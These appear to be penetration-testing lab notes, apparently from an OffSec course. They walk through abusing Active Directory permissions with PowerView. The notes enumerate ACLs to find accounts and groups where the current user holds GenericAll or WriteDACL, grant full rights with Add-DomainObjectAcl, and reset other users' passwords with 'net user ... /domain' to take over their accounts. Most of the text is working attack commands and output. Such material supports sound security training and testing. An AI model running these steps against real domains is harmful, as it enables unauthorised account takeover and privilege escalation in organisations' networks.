# The Get-ObjectAcl output prints the often-lengthy list of ACEs applied to the object.

    . .\powerview.ps1
    ps> Get-ObjectAcl -Identity offsec

    The output tells us that the AD object identified by the  S-1-5-21-634106289-3621871093-708134407-553 SID has ReadProperty access rights to the Offsec user. 


# We will try to find GenericAll access right on the server, we can see that, our current user (Offsec) has the GenericAll access right on the TestService1 account.

    AceType               : AccessAllowed
    ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com
    ActiveDirectoryRights : GenericAll

    Identity              : PROD\offsec

# The GenericAll access right gives us full control over the TestService1 user, which among other things, allows us to change the password of the account without knowledge of the old password:

    ps> net user testservice1 h4x /domain

    Now we can login on the apsrv01 server with below user.
    Les find domain group that our current user has explicit access rights.

    ps> Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

    AceType               : AccessAllowed
    ObjectDN              : CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com
    ActiveDirectoryRights : GenericAll

    We have access to testgroup, so we can add ourself into it and compromise that.
    All Active Directory objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself. 

    ps> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
    
    AceType               : AccessAllowed
    ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
    ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl

    Current user has WriteDACL access rights to the TestService2 user, which allows us to add new access rights like GenericAll.

    We can use the Add-DomainObjectAcl PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync1 if the targeted object is the domain object.

    ps> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
    ps> Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

    ActiveDirectoryRights : GenericAll

    Lets change the password of the user, and we are good to login on the server.

    net user testservice2 h4x /domain
    
